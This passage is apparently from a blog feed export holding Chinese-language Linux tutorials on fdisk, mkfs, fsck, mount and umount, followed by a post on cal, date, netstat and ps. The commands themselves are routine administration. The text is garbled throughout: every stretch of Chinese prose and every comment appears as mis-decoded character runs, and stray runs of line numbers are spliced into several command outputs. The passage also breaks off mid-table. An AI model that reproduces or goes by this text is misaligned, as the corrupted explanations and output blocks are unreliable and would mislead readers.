<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): p  &lt;== è¿™é‡Œå¯ä»¥è¾“å‡ºç›®å‰ç£ç›˜çš„çŠ¶æ€</span><br><span class="line">Disk /dev/mapper/rl-root: 70 GiB, 75161927680 bytes, 146800640 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0xbb210c3d</span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): q</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªæ˜¯æˆ‘çš„äº‘æœåŠ¡å™¨ï¼š</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">Command (m for help): p</span><br><span class="line"></span><br><span class="line">Disk /dev/vda:<span class="number"> 40 </span>GiB,<span class="number"> 42949672960 </span>bytes,<span class="number"> 83886080 </span>sectors</span><br><span class="line">Units: sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes</span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes</span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes</span><br><span class="line">Disklabel type: gpt</span><br><span class="line">Disk identifier: 8E31C5C4-D56B-4F46-A42F-54B90BC33E0C</span><br><span class="line"></span><br><span class="line">Device      Start      End  Sectors  Size Type</span><br><span class="line">/dev/vda1   <span class="number"> 2048 </span>   <span class="number"> 4095 </span>   <span class="number"> 2048 </span>   1M BIOS boot</span><br><span class="line">/dev/vda2   <span class="number"> 4096 </span> <span class="number"> 208895 </span> <span class="number"> 204800 </span> 100M EFI System</span><br><span class="line">/dev/vda3 <span class="number"> 208896 </span>83886046<span class="number"> 83677151 </span>39.9G Linux filesystem</span><br><span class="line">Command (m for help): q</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªæ˜¯æœ¬åšå®¢è½¬è½½åŸæ–‡ï¼š</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">Command (m for help): p  &lt;== è¿™é‡Œå¯ä»¥è¾“å‡ºç›®å‰ç£ç›˜çš„çŠ¶æ€</span><br><span class="line"></span><br><span class="line">Disk /dev/hdc: 41.1 GB,<span class="number"> 41174138880 </span>bytes        &lt;==è¿™ä¸ªç£ç›˜çš„æ–‡ä»¶åä¸å®¹é‡</span><br><span class="line">255 heads,<span class="number"> 63 </span>sectors/track,<span class="number"> 5005 </span>cylinders      &lt;==ç£å¤´ã€æ‰‡åŒºä¸ç£æŸ±å¤§å°</span><br><span class="line">Units = cylinders of<span class="number"> 16065 </span>*<span class="number"> 512 </span>=<span class="number"> 8225280 </span>bytes &lt;==æ¯ä¸ªç£æŸ±çš„å¤§å°</span><br><span class="line"></span><br><span class="line">   Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/hdc1   *          <span class="number"> 1 </span>        <span class="number"> 13 </span>    <span class="number"> 104391 </span> <span class="number"> 83 </span> Linux</span><br><span class="line">/dev/hdc2             <span class="number"> 14 </span>      <span class="number"> 1288 </span>   10241437+ <span class="number"> 83 </span> Linux</span><br><span class="line">/dev/hdc3           <span class="number"> 1289 </span>      <span class="number"> 1925 </span>    5116702+ <span class="number"> 83 </span> Linux</span><br><span class="line">/dev/hdc4           <span class="number"> 1926 </span>      <span class="number"> 5005 </span>  <span class="number"> 24740100 </span>  <span class="number"> 5 </span> Extended</span><br><span class="line">/dev/hdc5           <span class="number"> 1926 </span>      <span class="number"> 2052 </span>   <span class="number"> 1020096 </span> <span class="number"> 82 </span> Linux swap / Solaris</span><br><span class="line"><span class="comment"># è£…ç½®æ–‡ä»¶å å¯åŠ¨åŒºå¦ å¼€å§‹ç£æŸ±    ç»“æŸç£æŸ±  1Kå¤§å°å®¹é‡ ç£ç›˜åˆ†åŒºæ§½å†…çš„ç³»ç»Ÿ</span></span><br><span class="line"></span><br><span class="line">Command (m for help): q</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨ <code>p</code> å¯ä»¥åˆ—å‡ºç›®å‰è¿™é¢—ç£ç›˜çš„åˆ†å‰²è¡¨ä¿¡æ¯ï¼Œè¿™ä¸ªä¿¡æ¯çš„ä¸ŠåŠéƒ¨åœ¨æ˜¾ç¤ºæ•´ä½“ç£ç›˜çš„çŠ¶æ€ã€‚</p>
<h4 id="ç£ç›˜æ ¼å¼åŒ–">ç£ç›˜æ ¼å¼åŒ–</h4>
<p>ç£ç›˜åˆ†å‰²å®Œæ¯•åè‡ªç„¶å°±æ˜¯è¦è¿›è¡Œæ–‡ä»¶ç³»ç»Ÿçš„æ ¼å¼åŒ–ï¼Œæ ¼å¼åŒ–çš„å‘½ä»¤éå¸¸çš„ç®€å•ï¼Œä½¿ç”¨ <code>mkfs</code>ï¼ˆmake filesystemï¼‰ å‘½ä»¤ã€‚</p>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs [-t æ–‡ä»¶ç³»ç»Ÿæ ¼å¼] è£…ç½®æ–‡ä»¶å</span><br></pre></td></tr></table></figure>
<p>é€‰é¡¹ä¸å‚æ•°ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-t ï¼šå¯ä»¥æ¥æ–‡ä»¶ç³»ç»Ÿæ ¼å¼ï¼Œä¾‹å¦‚ ext3, ext2, vfat ç­‰(ç³»ç»Ÿæœ‰æ”¯æŒæ‰ä¼šç”Ÿæ•ˆ)</p>
</li>
</ul>
<p>æŸ¥çœ‹ mkfs æ”¯æŒçš„æ–‡ä»¶æ ¼å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@VM_0_9_centos web]# mkfs[tab]</span><br><span class="line">mkfs         mkfs.cramfs  mkfs.ext3    mkfs.minix   </span><br><span class="line">mkfs.btrfs   mkfs.ext2    mkfs.ext4    mkfs.xfs</span><br></pre></td></tr></table></figure>
<p>æŒ‰ä¸‹ä¸¤ä¸ª[tab]ï¼Œä¼šå‘ç° mkfs æ”¯æŒçš„æ–‡ä»¶æ ¼å¼å¦‚ä¸Šæ‰€ç¤ºã€‚</p>
<p>å°†åˆ†åŒº /dev/hdc6ï¼ˆå¯æŒ‡å®šå…¶ä»–åˆ†åŒºï¼‰ æ ¼å¼åŒ–ä¸ºext3æ–‡ä»¶ç³»ç»Ÿï¼š</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[root@www ~]# mkfs -t ext3 /dev/hdc6</span><br><span class="line">mke2fs 1.39 (29-May-2006)</span><br><span class="line">Filesystem label=                &lt;==è¿™é‡ŒæŒ‡çš„æ˜¯åˆ†å‰²æ§½çš„åç§°(label)</span><br><span class="line">OS type: Linux</span><br><span class="line">Block <span class="attribute">size</span>=4096 (<span class="attribute">log</span>=2)          &lt;==block çš„å¤§å°é…ç½®ä¸º 4K </span><br><span class="line">Fragment <span class="attribute">size</span>=4096 (<span class="attribute">log</span>=2)</span><br><span class="line">251392 inodes, 502023 blocks     &lt;==ç”±æ­¤é…ç½®å†³å®šçš„inode/blockæ•°é‡</span><br><span class="line">25101 blocks (5.00%) reserved <span class="keyword">for</span> the super<span class="built_in"> user</span></span><br><span class="line"><span class="built_in"></span>First data <span class="attribute">block</span>=0</span><br><span class="line">Maximum filesystem <span class="attribute">blocks</span>=515899392</span><br><span class="line">16 block groups</span><br><span class="line">32768 blocks per group, 32768 fragments per<span class="built_in"> group</span></span><br><span class="line"><span class="built_in"></span>15712 inodes per<span class="built_in"> group</span></span><br><span class="line"><span class="built_in"></span>Superblock backups stored on blocks:</span><br><span class="line">        32768, 98304, 163840, 229376, 294912</span><br><span class="line"></span><br><span class="line">Writing inode tables: done</span><br><span class="line">Creating journal (8192 blocks): done &lt;==æœ‰æ—¥å¿—è®°å½•</span><br><span class="line">Writing superblocks <span class="keyword">and</span> filesystem<span class="built_in"> accounting </span>information: done</span><br><span class="line"></span><br><span class="line">This filesystem will be automatically checked every 34 mounts <span class="keyword">or</span></span><br><span class="line">180 days, whichever comes first.  Use tune2fs -c <span class="keyword">or</span> -i <span class="keyword">to</span> override.</span><br><span class="line"><span class="comment"># è¿™æ ·å°±åˆ›å»ºèµ·æ¥æˆ‘ä»¬æ‰€éœ€è¦çš„ Ext3 æ–‡ä»¶ç³»ç»Ÿäº†ï¼ç®€å•æ˜äº†ï¼</span></span><br><span class="line">1234567891011121314151617181920212223</span><br></pre></td></tr></table></figure>
<h4 id="ç£ç›˜æ£€éªŒ">ç£ç›˜æ£€éªŒ</h4>
<p>fsckï¼ˆfile system checkï¼‰ç”¨æ¥æ£€æŸ¥å’Œç»´æŠ¤ä¸ä¸€è‡´çš„æ–‡ä»¶ç³»ç»Ÿã€‚</p>
<p>è‹¥ç³»ç»Ÿæ‰ç”µæˆ–ç£ç›˜å‘ç”Ÿé—®é¢˜ï¼Œå¯åˆ©ç”¨fsckå‘½ä»¤å¯¹æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œæ£€æŸ¥ã€‚</p>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">fsck <span class="selector-attr">[-t æ–‡ä»¶ç³»ç»Ÿ]</span> <span class="selector-attr">[-ACay]</span> è£…ç½®åç§°</span><br></pre></td></tr></table></figure>
<p>é€‰é¡¹ä¸å‚æ•°ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-t : ç»™å®šæ¡£æ¡ˆç³»ç»Ÿçš„å‹å¼ï¼Œè‹¥åœ¨ /etc/fstab ä¸­å·²æœ‰å®šä¹‰æˆ– kernel æœ¬èº«å·²æ”¯æ´çš„åˆ™ä¸éœ€åŠ ä¸Šæ­¤å‚æ•°</p>
</li>
<li class="lvl-2">
<p>-s : ä¾åºä¸€ä¸ªä¸€ä¸ªåœ°æ‰§è¡Œ fsck çš„æŒ‡ä»¤æ¥æ£€æŸ¥</p>
</li>
<li class="lvl-2">
<p>-A : å¯¹/etc/fstab ä¸­æ‰€æœ‰åˆ—å‡ºæ¥çš„ åˆ†åŒºï¼ˆpartitionï¼‰åšæ£€æŸ¥</p>
</li>
<li class="lvl-2">
<p>-C : æ˜¾ç¤ºå®Œæ•´çš„æ£€æŸ¥è¿›åº¦</p>
</li>
<li class="lvl-2">
<p>-d : æ‰“å°å‡º e2fsck çš„ debug ç»“æœ</p>
</li>
<li class="lvl-2">
<p>-p : åŒæ—¶æœ‰ -A æ¡ä»¶æ—¶ï¼ŒåŒæ—¶æœ‰å¤šä¸ª fsck çš„æ£€æŸ¥ä¸€èµ·æ‰§è¡Œ</p>
</li>
<li class="lvl-2">
<p>-R : åŒæ—¶æœ‰ -A æ¡ä»¶æ—¶ï¼Œçœç•¥ / ä¸æ£€æŸ¥</p>
</li>
<li class="lvl-2">
<p>-V : è¯¦ç»†æ˜¾ç¤ºæ¨¡å¼</p>
</li>
<li class="lvl-2">
<p>-a : å¦‚æœæ£€æŸ¥æœ‰é”™åˆ™è‡ªåŠ¨ä¿®å¤</p>
</li>
<li class="lvl-2">
<p>-r : å¦‚æœæ£€æŸ¥æœ‰é”™åˆ™ç”±ä½¿ç”¨è€…å›ç­”æ˜¯å¦ä¿®å¤</p>
</li>
<li class="lvl-2">
<p>-y : é€‰é¡¹æŒ‡å®šæ£€æµ‹æ¯ä¸ªæ–‡ä»¶æ˜¯è‡ªåŠ¨è¾“å…¥yesï¼Œåœ¨ä¸ç¡®å®šé‚£äº›æ˜¯ä¸æ­£å¸¸çš„æ—¶å€™ï¼Œå¯ä»¥æ‰§è¡Œ # fsck -y å…¨éƒ¨æ£€æŸ¥ä¿®å¤ã€‚</p>
</li>
</ul>
<p>æŸ¥çœ‹ç³»ç»Ÿæœ‰å¤šå°‘æ–‡ä»¶ç³»ç»Ÿæ”¯æŒçš„ fsck å‘½ä»¤ï¼š</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[root@www ~]</span># fsck<span class="selector-attr">[tab]</span><span class="selector-attr">[tab]</span></span><br><span class="line">fsck         fsck<span class="selector-class">.cramfs</span>  fsck<span class="selector-class">.ext2</span>    fsck<span class="selector-class">.ext3</span>    fsck<span class="selector-class">.msdos</span>   fsck<span class="selector-class">.vfat</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>å¼ºåˆ¶æ£€æµ‹ /dev/hdc6 åˆ†åŒº:</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">root@www</span> <span class="string">~</span>]<span class="comment"># fsck -C -f -t ext3 /dev/hdc6 </span></span><br><span class="line"><span class="string">fsck</span> <span class="number">1.39</span> <span class="string">(29-May-2006)</span></span><br><span class="line"><span class="string">e2fsck</span> <span class="number">1.39</span> <span class="string">(29-May-2006)</span></span><br><span class="line"><span class="attr">Pass 1:</span> <span class="string">Checking</span> <span class="string">inodes,</span> <span class="string">blocks,</span> <span class="string">and</span> <span class="string">sizes</span></span><br><span class="line"><span class="attr">Pass 2:</span> <span class="string">Checking</span> <span class="string">directory</span> <span class="string">structure</span></span><br><span class="line"><span class="attr">Pass 3:</span> <span class="string">Checking</span> <span class="string">directory</span> <span class="string">connectivity</span></span><br><span class="line"><span class="attr">Pass 4:</span> <span class="string">Checking</span> <span class="string">reference</span> <span class="string">counts</span></span><br><span class="line"><span class="attr">Pass 5:</span> <span class="string">Checking</span> <span class="string">group</span> <span class="string">summary</span> <span class="string">information</span></span><br><span class="line"><span class="attr">vbird_logical:</span> <span class="number">11</span><span class="string">/251968</span> <span class="string">files</span> <span class="string">(9.1%</span> <span class="string">non-contiguous),</span> <span class="number">36926</span><span class="string">/1004046</span> <span class="string">blocks</span></span><br><span class="line"><span class="number">123456789</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœæ²¡æœ‰åŠ ä¸Š -f çš„é€‰é¡¹ï¼Œåˆ™ç”±äºè¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸æ›¾å‡ºç°é—®é¢˜ï¼Œæ£€æŸ¥çš„ç»è¿‡éå¸¸å¿«é€Ÿï¼è‹¥åŠ ä¸Š -f å¼ºåˆ¶æ£€æŸ¥ï¼Œæ‰ä¼šä¸€é¡¹ä¸€é¡¹çš„æ˜¾ç¤ºè¿‡ç¨‹ã€‚</p>
<h4 id="ç£ç›˜æŒ‚è½½ä¸å¸é™¤">ç£ç›˜æŒ‚è½½ä¸å¸é™¤</h4>
<p>Linux çš„ç£ç›˜æŒ‚è½½ä½¿ç”¨ <code>mount</code> å‘½ä»¤ï¼Œå¸è½½ä½¿ç”¨ <code>umount</code> å‘½ä»¤ã€‚</p>
<p>ç£ç›˜æŒ‚è½½è¯­æ³•ï¼š</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">mount <span class="selector-attr">[-t æ–‡ä»¶ç³»ç»Ÿ]</span> <span class="selector-attr">[-L Labelå]</span> <span class="selector-attr">[-o é¢å¤–é€‰é¡¹]</span> <span class="selector-attr">[-n]</span>  è£…ç½®æ–‡ä»¶å  æŒ‚è½½ç‚¹</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>ç”¨é»˜è®¤çš„æ–¹å¼ï¼Œå°†åˆšåˆšåˆ›å»ºçš„ /dev/hdc6 æŒ‚è½½åˆ° /mnt/hdc6 ä¸Šé¢ï¼</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@www</span> ~]<span class="comment"># mkdir /mnt/hdc6</span></span><br><span class="line">[root<span class="variable">@www</span> ~]<span class="comment"># mount /dev/hdc6 /mnt/hdc6</span></span><br><span class="line">[root<span class="variable">@www</span> ~]<span class="comment"># df</span></span><br><span class="line">Filesystem           <span class="number">1</span>K-blocks      Used Available Use% Mounted on</span><br><span class="line">.....ä¸­é—´çœç•¥.....</span><br><span class="line"><span class="regexp">/dev/hdc</span>6              <span class="number">1976312</span>     <span class="number">42072</span>   <span class="number">1833836</span>   <span class="number">3</span>% <span class="regexp">/mnt/hdc</span>6</span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>ç£ç›˜å¸è½½å‘½ä»¤ <code>umount</code> è¯­æ³•ï¼š</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">umount</span> [-<span class="meta">fn</span>] è£…ç½®æ–‡ä»¶åæˆ–æŒ‚è½½ç‚¹</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>é€‰é¡¹ä¸å‚æ•°ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-f ï¼šå¼ºåˆ¶å¸é™¤ï¼å¯ç”¨åœ¨ç±»ä¼¼ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿ (NFS) æ— æ³•è¯»å–åˆ°çš„æƒ…å†µä¸‹ï¼›</p>
</li>
<li class="lvl-2">
<p>-n ï¼šä¸å‡çº§ /etc/mtab æƒ…å†µä¸‹å¸é™¤ã€‚</p>
</li>
</ul>
<p>å¸è½½/dev/hdc6</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@www</span> ~]<span class="meta"># umount /dev/hdc6     </span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>æœ¬æ–‡å‚è€ƒï¼š</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€Linuxã€‘ç³»ç»Ÿç®¡ç†</title>
    <url>/posts/dd673edb/</url>
    <content><![CDATA[<h2 id="æŸ¥çœ‹å½“å‰æ—¥å†ï¼šcal">æŸ¥çœ‹å½“å‰æ—¥å†ï¼šcal</h2>
<p>calå‘½ä»¤ç”¨äºæŸ¥çœ‹å½“å‰æ—¥å†ï¼Œ-yæ˜¾ç¤ºæ•´å¹´æ—¥å†ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~$ cal</span><br><span class="line">      åä¸€æœˆ 2019        </span><br><span class="line">æ—¥ ä¸€ äºŒ ä¸‰ å›› äº” å…­  </span><br><span class="line">                1  2  </span><br><span class="line"> 3  4  5  6  7  8  9  </span><br><span class="line">10 11 12 13 14 15 16  </span><br><span class="line">17 18 19 20 21 22 23  </span><br><span class="line">24 25 26 27 28 29 30 </span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2 id="æ˜¾ç¤ºæˆ–è®¾ç½®æ—¶é—´ï¼šdate">æ˜¾ç¤ºæˆ–è®¾ç½®æ—¶é—´ï¼šdate</h2>
<p>è®¾ç½®æ—¶é—´æ ¼å¼ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">date</span> [MMDDhhmm[[CC]YY][.ss]] +format</span><br></pre></td></tr></table></figure>
<p>MMä¸ºæœˆï¼ŒDDä¸ºå¤©ï¼Œhhä¸ºå°æ—¶ï¼Œmmä¸ºåˆ†é’Ÿï¼›CCä¸ºå¹´å‰ä¸¤ä½ï¼ŒYYä¸ºå¹´çš„åä¸¤ä½ï¼Œssä¸ºç§’ã€‚</p>
<p>å¦‚ï¼š date 010203042016.55ã€‚</p>
<p>æ˜¾ç¤ºæ—¶é—´æ ¼å¼ï¼ˆdate â€˜+%y,%m,%d,%H,%M,%Sâ€™ï¼‰ï¼š</p>
<table>
<thead>
<tr>
<th>formatæ ¼å¼</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>%Yï¼Œ%y</td>
<td>å¹´</td>
</tr>
<tr>
<td>%m</td>
<td>æœˆ</td>
</tr>
<tr>
<td>%d</td>
<td>æ—¥</td>
</tr>
<tr>
<td>%H</td>
<td>æ—¶</td>
</tr>
<tr>
<td>%M</td>
<td>åˆ†</td>
</tr>
<tr>
<td>%S</td>
<td>ç§’</td>
</tr>
</tbody>
</table>
<h2 id="æŸ¥çœ‹ç½‘ç»œçŠ¶æ€ï¼šnetstat">æŸ¥çœ‹ç½‘ç»œçŠ¶æ€ï¼šnetstat</h2>
<p>netstatå‘½ä»¤ç”¨äºæ˜¾ç¤ºç½‘ç»œçŠ¶æ€ã€‚</p>
<p>åˆ©ç”¨netstatæŒ‡ä»¤å¯è®©ä½ å¾—çŸ¥æ•´ä¸ªLinuxç³»ç»Ÿçš„ç½‘ç»œæƒ…å†µã€‚</p>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat [-acCeFghilMnNoprstuvVwx][-A&lt;ç½‘ç»œç±»å‹&gt;][--ip]</span><br></pre></td></tr></table></figure>
<p><strong>å‚æ•°è¯´æ˜</strong>ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-aæˆ–â€“all æ˜¾ç¤ºæ‰€æœ‰è¿çº¿ä¸­çš„Socketã€‚</p>
</li>
<li class="lvl-2">
<p>-A&lt;ç½‘ç»œç±»å‹&gt;æˆ–â€“&lt;ç½‘ç»œç±»å‹&gt; åˆ—å‡ºè¯¥ç½‘ç»œç±»å‹è¿çº¿ä¸­çš„ç›¸å…³åœ°å€ã€‚</p>
</li>
<li class="lvl-2">
<p>-cæˆ–â€“continuous æŒç»­åˆ—å‡ºç½‘ç»œçŠ¶æ€ã€‚</p>
</li>
<li class="lvl-2">
<p>-Cæˆ–â€“cache æ˜¾ç¤ºè·¯ç”±å™¨é…ç½®çš„å¿«å–ä¿¡æ¯ã€‚</p>
</li>
<li class="lvl-2">
<p>-eæˆ–â€“extend æ˜¾ç¤ºç½‘ç»œå…¶ä»–ç›¸å…³ä¿¡æ¯ã€‚</p>
</li>
<li class="lvl-2">
<p>-Fæˆ–â€“fib æ˜¾ç¤ºFIBã€‚</p>
</li>
<li class="lvl-2">
<p>-gæˆ–â€“groups æ˜¾ç¤ºå¤šé‡å¹¿æ’­åŠŸèƒ½ç¾¤ç»„ç»„å‘˜åå•ã€‚</p>
</li>
<li class="lvl-2">
<p>-hæˆ–â€“help åœ¨çº¿å¸®åŠ©ã€‚</p>
</li>
<li class="lvl-2">
<p>-iæˆ–â€“interfaces æ˜¾ç¤ºç½‘ç»œç•Œé¢ä¿¡æ¯è¡¨å•ã€‚</p>
</li>
<li class="lvl-2">
<p>-læˆ–â€“listening æ˜¾ç¤ºç›‘æ§ä¸­çš„æœåŠ¡å™¨çš„Socketã€‚</p>
</li>
<li class="lvl-2">
<p>-Mæˆ–â€“masquerade æ˜¾ç¤ºä¼ªè£…çš„ç½‘ç»œè¿çº¿ã€‚</p>
</li>
<li class="lvl-2">
<p>-næˆ–â€“numeric ç›´æ¥ä½¿ç”¨IPåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨ã€‚</p>
</li>
<li class="lvl-2">
<p>-Næˆ–â€“netlinkæˆ–â€“symbolic æ˜¾ç¤ºç½‘ç»œç¡¬ä»¶å¤–å›´è®¾å¤‡çš„ç¬¦å·è¿æ¥åç§°ã€‚</p>
</li>
<li class="lvl-2">
<p>-oæˆ–â€“timers æ˜¾ç¤ºè®¡æ—¶å™¨ã€‚</p>
</li>
<li class="lvl-2">
<p>-pæˆ–â€“programs æ˜¾ç¤ºæ­£åœ¨ä½¿ç”¨Socketçš„ç¨‹åºè¯†åˆ«ç å’Œç¨‹åºåç§°ã€‚</p>
</li>
<li class="lvl-2">
<p>-ræˆ–â€“route æ˜¾ç¤ºRouting Tableã€‚</p>
</li>
<li class="lvl-2">
<p>-sæˆ–â€“statistice æ˜¾ç¤ºç½‘ç»œå·¥ä½œä¿¡æ¯ç»Ÿè®¡è¡¨ã€‚</p>
</li>
<li class="lvl-2">
<p>-tæˆ–â€“tcp æ˜¾ç¤ºTCPä¼ è¾“åè®®çš„è¿çº¿çŠ¶å†µã€‚</p>
</li>
<li class="lvl-2">
<p>-uæˆ–â€“udp æ˜¾ç¤ºUDPä¼ è¾“åè®®çš„è¿çº¿çŠ¶å†µã€‚</p>
</li>
<li class="lvl-2">
<p>-væˆ–â€“verbose æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ã€‚</p>
</li>
<li class="lvl-2">
<p>-Væˆ–â€“version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚</p>
</li>
<li class="lvl-2">
<p>-wæˆ–â€“raw æ˜¾ç¤ºRAWä¼ è¾“åè®®çš„è¿çº¿çŠ¶å†µã€‚</p>
</li>
<li class="lvl-2">
<p>-xæˆ–â€“unix æ­¤å‚æ•°çš„æ•ˆæœå’ŒæŒ‡å®š&quot;-A unix&quot;å‚æ•°ç›¸åŒã€‚</p>
</li>
<li class="lvl-2">
<p>â€“ipæˆ–â€“inet æ­¤å‚æ•°çš„æ•ˆæœå’ŒæŒ‡å®š&quot;-A inet&quot;å‚æ•°ç›¸åŒã€‚</p>
</li>
</ul>
<p>å¸¸ç”¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# netstat -nltp</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      829/sshd            </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      829/sshd</span><br></pre></td></tr></table></figure>
<h2 id="æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯ï¼šps">æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯ï¼šps</h2>
<p>è¿›ç¨‹æ˜¯ä¸€ä¸ªå…·æœ‰ä¸€å®šç‹¬ç«‹åŠŸèƒ½çš„ç¨‹åºï¼Œå®ƒæ˜¯æ“ä½œç³»ç»ŸåŠ¨æ€æ‰§è¡Œçš„åŸºæœ¬å•å…ƒã€‚</p>
<p><strong>pså‘½ä»¤é€‰é¡¹ï¼š</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>ps a æ˜¾ç¤ºç°è¡Œç»ˆç«¯æœºä¸‹çš„æ‰€æœ‰ç¨‹åºï¼ŒåŒ…æ‹¬å…¶ä»–ç”¨æˆ·çš„ç¨‹åºã€‚</p>
</li>
<li class="lvl-2">
<p>ps -A æ˜¾ç¤ºæ‰€æœ‰ç¨‹åºã€‚</p>
</li>
<li class="lvl-2">
<p>ps c åˆ—å‡ºç¨‹åºæ—¶ï¼Œæ˜¾ç¤ºæ¯ä¸ªç¨‹åºçœŸæ­£çš„æŒ‡ä»¤åç§°ï¼Œè€Œä¸åŒ…å«è·¯ å¾„ï¼Œå‚æ•°æˆ–å¸¸é©»æœåŠ¡çš„æ ‡ç¤ºã€‚</p>
</li>
<li class="lvl-2">
<p>ps -e æ­¤å‚æ•°çš„æ•ˆæœå’ŒæŒ‡å®š&quot;A&quot;å‚æ•°ç›¸åŒã€‚</p>
</li>
<li class="lvl-2">
<p>ps e åˆ—å‡ºç¨‹åºæ—¶ï¼Œæ˜¾ç¤ºæ¯ä¸ªç¨‹åºæ‰€ä½¿ç”¨çš„ç¯å¢ƒå˜é‡ã€‚</p>
</li>
<li class="lvl-2">
<p>ps f ç”¨ASCIIå­—ç¬¦æ˜¾ç¤ºæ ‘çŠ¶ç»“æ„ï¼Œè¡¨è¾¾ç¨‹åºé—´çš„ç›¸äº’å…³ç³»ã€‚</p>
</li>
<li class="lvl-2">
<p>ps -H æ˜¾ç¤ºæ ‘çŠ¶ç»“æ„ï¼Œè¡¨ç¤ºç¨‹åºé—´çš„ç›¸äº’å…³ç³»ã€‚</p>
</li>
<li class="lvl-2">
<p>ps -N æ˜¾ç¤ºæ‰€æœ‰çš„ç¨‹åºï¼Œé™¤äº†æ‰§è¡ŒpsæŒ‡ä»¤ç»ˆç«¯æœºä¸‹çš„ç¨‹åºä¹‹å¤–ã€‚</p>
</li>
<li class="lvl-2">
<p>ps s é‡‡ç”¨ç¨‹åºä¿¡å·çš„æ ¼å¼æ˜¾ç¤ºç¨‹åºçŠ¶å†µã€‚</p>
</li>
<li class="lvl-2">
<p>ps u ä»¥ç”¨æˆ·ä¸ºä¸»çš„æ ¼å¼æ¥æ˜¾ç¤ºç¨‹åºçŠ¶å†µã€‚</p>
</li>
<li class="lvl-2">
<p>ps x æ˜¾ç¤ºæ‰€æœ‰ç¨‹åºï¼Œä¸ä»¥ç»ˆç«¯æœºæ¥åŒºåˆ†ã€‚</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>-a</td>
<td>æ˜¾ç¤ºç»ˆç«¯ä¸Šçš„æ‰€æœ‰è¿›ç¨‹ï¼ŒåŒ…æ‹¬å…¶ä»–ç”¨æˆ·çš„è¿›ç¨‹</td>
</tr>
<tr>
<td>-u</td>
<td>æ˜¾ç¤ºè¿›ç¨‹çš„è¯¦ç»†çŠ¶æ€</td>
</tr>
<tr>
<td>-x</td>
<td>æ˜¾ç¤ºæ²¡æœ‰æ§åˆ¶ç»ˆç«¯çš„è¿›ç¨‹</td>
</tr>
<tr>
<td>-w</td>
<td>æ˜¾ç¤ºåŠ å®½ï¼Œä»¥ä¾¿æ˜¾ç¤ºæ›´å¤šçš„ä¿¡æ¯</td>
</tr>
<tr>
<td>-r</td>
